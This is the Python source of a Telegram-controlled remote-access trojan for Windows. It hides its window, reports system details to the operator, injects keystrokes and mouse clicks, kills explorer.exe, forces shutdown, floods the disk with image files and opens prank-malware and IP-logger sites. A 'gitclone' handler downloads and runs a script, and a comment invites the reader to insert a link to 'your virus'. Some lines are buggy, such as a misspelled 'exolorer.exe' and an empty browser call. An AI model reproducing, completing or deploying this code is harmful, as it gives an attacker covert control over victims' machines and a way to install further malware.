from aiogram import Bot, Dispatcher, executor, types
import time, os, pyttsx3, pyautogui, platform, wget, webbrowser, random, sys

# BOT
Token = 'TOKEN'

pyautogui.hotkey('win', 'shift', 'down')

bot = Bot(token=Token)
dp = Dispatcher(bot=bot)

# COMMANDS
@dp.message_handler(commands=['start', 'panel'])
async def hack(message: types.Message):
    await message.answer('|new user: connected|')
    await message.answer(platform.system())
    await message.answer(platform.processor())
    await message.answer(platform.machine())
    await message.answer(platform.win32_ver())
    await message.answer(platform.release())
    await message.answer('/panel /TrolMENU /ip /Del /min /cmd /tpd /enter /back /left /right /leftM /rightM /Desktops /Desk_create /Desk_L /Desk_R /gitclone /close /say /site /info /imgspam /Lclick /Rclick /Dscroll /Uscroll')
    await message.delete()
    pass

@dp.message_handler(commands=['cmd', 'cpanel', 'command panel', 'cp'])
async def hack(message: types.Message):   
    os.system('start')
    await message.delete()
    pass

@dp.message_handler(commands=['ip'])
async def hack(message: types.Message):
    # IPLOGER LINK
    webbrowser.open('')
    pass

@dp.message_handler(commands=['idiot']) # youareanidiot site!
async def hack(message: types.Message):
    webbrowser.open('https://idiot.malwarepad.com/')
    await message.delete()
    pass

@dp.message_handler(commands=['mem'])
async def hack(message: types.Message):
    webbrowser.open('https://www.youtube.com/watch?v=mpYdDJd-mSY')
    time.sleep(120)
    pyautogui.hotkey('ctrl', 'w')
    webbrowser.open('https://youtu.be/8jfOY4vrOLU')
    time.sleep(120)
    pyautogui.hotkey('ctrl', 'w')
    webbrowser.open('https://youtu.be/fGTZtTE9-Do')
    time.sleep(120)
    pyautogui.hotkey('ctrl', 'w')
    webbrowser.open('https://youtu.be/YvW2A0C1XQY')
    await message.delete()
    pass

@dp.message_handler(commands=['boot'])
async def hack(message: types.Message):
    os.system('shutdown /s /r /t 0')
    await message.delete()
    pass

@dp.message_handler(commands=['TrolMENU'])
async def hack(message: types.Message):
    await message.answer(f'/mem, /idiot, /boot, /explorer, /STSCRIPT')
    await message.delete()
    pass

@dp.message_handler(commands=['min'])
async def hack(message: types.Message):
    pyautogui.hotkey('win', 'shift', 'down')
    await message.delete()
    pass

@dp.message_handler(commands=['Desk_create'])
async def hack(message: types.Message):
    pyautogui.hotkey('ctrl', 'win', 'd')
    await message.delete()
    pass

@dp.message_handler(commands=['Desktops'])
async def hack(message: types.Message):
    pyautogui.hotkey('win', 'tab')
    await message.delete()
    pass

@dp.message_handler(commands=['Desk_R'])
async def hack(message: types.Message):
    pyautogui.hotkey('ctrl', 'win', 'right')
    await message.delete()
    pass

@dp.message_handler(commands=['Desk_L'])
async def hack(message: types.Message):
    pyautogui.hotkey('ctrl', 'win', 'left')
    await message.delete()
    pass

@dp.message_handler(commands=['typed', 'tpd'])
async def hack(message: types.Message):
    pyautogui.typewrite(message.text)
    await message.delete()
    pass

@dp.message_handler(commands=['enter'])
async def hack(message: types.Message):
    pyautogui.press('enter')
    await message.delete()
    pass

@dp.message_handler(commands=['back'])
async def hack(message: types.Message):
    pyautogui.press('backspace')
    await message.delete()
    pass

@dp.message_handler(commands=['Del'])
async def hack(message: types.Message):
    pyautogui.press('delete')
    await message.delete()
    pass

@dp.message_handler(commands=['left'])
async def hack(message: types.Message):
    pyautogui.press('left')
    await message.delete()
    pass

@dp.message_handler(commands=['right'])
async def hack(message: types.Message):
    pyautogui.press('right')
    await message.delete()
    pass

@dp.message_handler(commands=['leftM'])
async def hack(message: types.Message):
    for i in range(150):
        pyautogui.press('left')
        await message.delete()
        pass
    pass

@dp.message_handler(commands=['rightM'])
async def hack(message: types.Message):
    for i in range(150):
        pyautogui.press('right')
        await message.delete()
        pass
    pass


# Check this command, find mistakes and copy link to your virus
@dp.message_handler(commands=['gitclone', 'scriptST', 'STSCRIPT'])
async def hack(message: types.Message):
    # This line
    wget.download('')
    # Next
    os.system('start script.py')
    await message.reply('script loaded and started!')
    await message.delete()
    pass

@dp.message_handler(commands=['explorer'])
async def hack(message: types.Message):
    os.system('@echo off')
    os.system('Taskkill/f /im explorer.exe')
    time.sleep(15)
    os.system('exolorer.exe')
    await message.delete()
    pass

@dp.message_handler(commands=['close'])
async def hack(message: types.Message):
    pyautogui.hotkey('alt', 'f4')
    await message.delete()
    pass

@dp.message_handler(commands=['site'])
async def hack(message: types.Message):
    webbrowser.open()
    await message.delete()
    pass

@dp.message_handler(commands=['info'])
async def hack(message: types.Message):
    await message.answer(platform.system())
    await message.answer(platform.processor())
    await message.answer(platform.machine())
    await message.answer(platform.win32_ver())
    await message.answer(platform.release())
    await message.delete()
    pass

@dp.message_handler(commands=['say'])
async def hack(message: types.Message):
    engine = pyttsx3.init()
    engine.say(message.text)
    engine.runAndWait()
    # await message.reply('Succesfull')
    await message.delete()
    pass

@dp.message_handler(commands=['imgspam'])
async def hack(message: types.Message):
    a = 1
    for i in range(150):
        os.system(f'curl https://i.ytimg.com/vi/MLmh90WhAR8/maxresdefault.jpg --output 0OpenMe{a}.png')
        a = a + 1
        pass
    await message.delete()
    pass

@dp.message_handler(commands=['Lclick'])
async def hack(message: types.Message):   
    pyautogui.leftClick()
    await message.delete()
    pass

@dp.message_handler(commands=['Rclick'])
async def hack(message: types.Message):   
    pyautogui.rightClick()
    await message.delete()
    pass

@dp.message_handler(commands=['Dscroll'])
async def hack(message: types.Message):   
    pyautogui.scroll(-10)
    await message.delete()
    pass

@dp.message_handler(commands=['Uscroll'])
async def hack(message: types.Message):   
    pyautogui.scroll(10)
    await message.delete()
    pass

if __name__ == '__main__':
    executor.start_polling(dp)